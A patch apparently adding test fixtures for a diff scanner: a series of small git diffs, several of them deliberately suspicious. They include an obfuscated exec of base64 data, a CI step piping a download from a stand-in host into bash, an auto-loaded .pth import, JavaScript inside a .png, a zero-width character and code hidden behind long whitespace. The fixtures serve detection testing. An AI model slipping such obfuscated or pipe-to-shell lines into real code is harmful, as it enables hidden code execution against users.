@@ -1,0 +1,88 @@
+diff --git tests/conftest.py tests/conftest.py
+new file mode 100644
+--- /dev/null
++++ tests/conftest.py
+@@ -0,0 +1,2 @@
++++i
++x = 1
+diff --git old.py new.py
+similarity index 90%
+rename from old.py
+rename to new.py
+--- old.py
++++ new.py
+@@ -1 +1 @@
+-a
++b
+diff --git .vscode/launch.json .vscode/launch.json
+deleted file mode 100644
+--- .vscode/launch.json
++++ /dev/null
+@@ -1 +0,0 @@
+-{}
+diff --git tests/data/x.png tests/data/x.png
+new file mode 100644
+Binary files /dev/null and tests/data/x.png differ
+diff --git foo.pth foo.pth
+new file mode 100644
+--- /dev/null
++++ foo.pth
+@@ -0,0 +1 @@
++import os
+diff --git sorl/x.py sorl/x.py
+--- sorl/x.py
++++ sorl/x.py
+@@ -0,0 +1 @@
++exec(base64.b64decode(blob))
+diff --git docs/install.rst docs/install.rst
+--- docs/install.rst
++++ docs/install.rst
+@@ -0,0 +1 @@
++    curl -LsSf https://astral.sh/uv/install.sh | sh
+diff --git .github/workflows/x.yml .github/workflows/x.yml
+--- .github/workflows/x.yml
++++ .github/workflows/x.yml
+@@ -0,0 +1 @@
++      run: curl -s https://example.com/x | bash
+diff --git tests/data/y.png tests/data/y.png
+new file mode 100644
+--- /dev/null
++++ tests/data/y.png
+@@ -0,0 +1 @@
++console.log(1)
+diff --git .vscode/tasks.json .vscode/tasks.json
+new file mode 100644
+--- /dev/null
++++ .vscode/tasks.json
+@@ -0,0 +1 @@
++{"version": "2.0.0", "tasks": []}
+diff --git README.rst README.rst
+--- README.rst
++++ README.rst
+@@ -0,0 +1 @@
++hello​world
+diff --git sorl/y.py sorl/y.py
+--- sorl/y.py
++++ sorl/y.py
+@@ -0,0 +1 @@
++                                                                                                    x = 1
+diff --git tests/u.py tests/u.py
+--- tests/u.py
++++ tests/u.py
+@@ -0,0 +1 @@
++s = "\u0061\u0062\u0063\u0064"
+diff --git tests/v.py tests/v.py
+--- tests/v.py
++++ tests/v.py
+@@ -0,0 +1 @@
++s = R['\u006C\u0065\u006E\u0067\u0074\u0068']
+diff --git docs/emoji.md docs/emoji.md
+--- docs/emoji.md
++++ docs/emoji.md
+@@ -0,0 +1 @@
++family 👨‍👩‍👧 and ⚠️
+diff --git sorl/thumbnail/engines/pil_engine.py sorl/thumbnail/engines/pil_engine.py
+--- sorl/thumbnail/engines/pil_engine.py
++++ sorl/thumbnail/engines/pil_engine.py
+@@ -0,0 +1 @@
++    image.save(buf, format="PNG")
